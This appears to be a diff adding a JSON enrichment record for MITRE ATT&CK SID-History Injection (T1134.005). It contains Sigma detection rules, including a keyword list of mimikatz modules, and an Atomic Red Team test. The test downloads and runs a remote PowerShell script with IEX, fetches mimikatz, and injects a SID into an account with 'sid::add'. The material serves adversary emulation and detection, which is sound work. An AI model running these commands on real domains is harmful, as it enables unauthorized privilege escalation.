@@ -1,0 +1,112 @@
+{
+    "id": "T1134.005",
+    "name": "SID-History Injection",
+    "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](T1021), [SMB/Windows Admin Shares](T1021.002), or [Windows Remote Management](T1021.006).",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion, Privilege Escalation",
+    "data_sources": "Process: OS API Execution, User Account: User Account Metadata, Active Directory: Active Directory Object Modification",
+    "detection": "Examine data in user’s SID-History attributes using the PowerShell `Get-ADUser` cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\nMonitor for Windows API calls to the `DsAddSidHistory` function. (Citation: Microsoft DsAddSidHistory)",
+    "url": "https://attack.mitre.org/techniques/T1134/005",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1134.005",
+                "atomic_attack_guid": "6bef32e5-9456-4072-8f14-35566fb85401",
+                "atomic_attack_name": "Injection SID-History with mimikatz",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - Mimikatz Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
+                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Mimikatz Binary Execution",
+                        "rule_link": "https://research.splunk.com/endpoint/a9e0d6d3-9676-4e26-994d-4e0406bb4467/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "b7dc639b-24cd-482d-a7f1-8897eda21023",
+                    "2632954e-db1c-49cb-9936-67d1ef1d17d2"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "b7dc639b-24cd-482d-a7f1-8897eda21023",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1134.005",
+                            "mitre-cti:description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",
+                            "mitre-cti:name": "SID-History Injection",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Alain Homewood, Insomnia Security', 'Vincent Le Toux'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023', 'type': 'attack-pattern', 'created': '2020-02-18T18:34:49.414Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1134.005', 'url': 'https://attack.mitre.org/techniques/T1134/005'}, {'url': 'https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx', 'description': 'Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.', 'source_name': 'Microsoft SID'}, {'url': 'https://msdn.microsoft.com/library/ms679833.aspx', 'description': 'Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.', 'source_name': 'Microsoft SID-History Attribute'}, {'url': 'https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems', 'description': 'Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.', 'source_name': 'Microsoft Well Known SIDs Jun 2017'}, {'url': 'https://technet.microsoft.com/library/ee617241.aspx', 'description': 'Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.', 'source_name': 'Microsoft Get-ADUser'}, {'url': 'https://adsecurity.org/?p=1772', 'description': 'Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.', 'source_name': 'AdSecurity SID History Sept 2015'}, {'url': 'https://msdn.microsoft.com/library/ms677982.aspx', 'description': 'Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.', 'source_name': 'Microsoft DsAddSidHistory'}], 'modified': '2021-02-09T15:49:58.414Z', 'name': 'SID-History Injection', 'description': 'Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\\n\\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': 'Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\\n\\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Active Directory: Active Directory Object Modification', 'Process: OS API Execution', 'User Account: User Account Metadata'], 'x_mitre_permissions_required': ['Administrator', 'SYSTEM']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2632954e-db1c-49cb-9936-67d1ef1d17d2",
+                        "lookup_data": {
+                            "description": "An attacker can use the SID history attribute to gain additional privileges.",
+                            "raw": "author: Thomas Patzke, @atc_project (improvements)\ndate: 2017/02/19\ndescription: An attacker can use the SID history attribute to gain additional privileges.\ndetection:\n  condition: selection1 or (selection2 and not selection3 and not filter_null)\n  filter_null:\n    SidHistory: null\n  selection1:\n    EventID:\n    - 4765\n    - 4766\n  selection2:\n    EventID: 4738\n  selection3:\n    SidHistory:\n    - '-'\n    - '%%1793'\nfalsepositives:\n- Migration of an account into a new domain\nid: 2632954e-db1c-49cb-9936-67d1ef1d17d2\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nreferences:\n- https://adsecurity.org/?p=1772\nstatus: stable\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1134.005\ntitle: Addition of SID History to Active Directory Object\n",
+                            "sigma:id": "2632954e-db1c-49cb-9936-67d1ef1d17d2",
+                            "title": "Addition of SID History to Active Directory Object",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1134.005",
+                "display_name": "Access Token Manipulation: SID-History Injection",
+                "atomic_tests": [
+                    {
+                        "name": "Injection SID-History with mimikatz",
+                        "auto_generated_guid": "6bef32e5-9456-4072-8f14-35566fb85401",
+                        "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "sid_to_inject": {
+                                "description": "SID to inject into sidhistory",
+                                "type": "string",
+                                "default": "S-1-5-21-1004336348-1177238915-682003330-1134"
+                            },
+                            "sam_account_name": {
+                                "description": "Target account to modify",
+                                "type": "string",
+                                "default": "$env:username"
+                            },
+                            "mimikatz_path": {
+                                "description": "Mimikatz windows executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+                                "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "#{mimikatz_path} \"privilege::debug\" \"sid::patch\" \"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\" \"exit\"\n",
+                            "cleanup_command": "#{mimikatz_path} \"sid::clear /sam:#{sam_account_name}\" \"exit\"\n"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 13:28:04"
+}
